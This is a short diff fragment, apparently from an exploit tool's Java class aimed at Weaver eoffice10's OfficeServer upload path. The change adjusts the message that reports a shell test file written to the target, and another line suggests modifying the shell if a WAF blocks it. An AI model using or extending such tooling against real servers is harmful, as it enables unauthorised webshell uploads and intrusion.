@@ -41,7 +41,7 @@ public class weaveroa_eoffice10_OfficeServer implements Exploitlnterface {
                     , "utf-8");
 
             if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
-                textArea.appendText("\n 测试文件写入 " + url + "/eoffice10/server/public/iWebOffice2015/Document/" +filename);
+                textArea.appendText("\n 测试文件写入 \n" + url + "/eoffice10/server/public/iWebOffice2015/Document/" +filename);
                 return true;
             }else {
                 textArea.appendText("\n 若txt文件写入成功则为WAF拦截 请手动复现或修改shell");
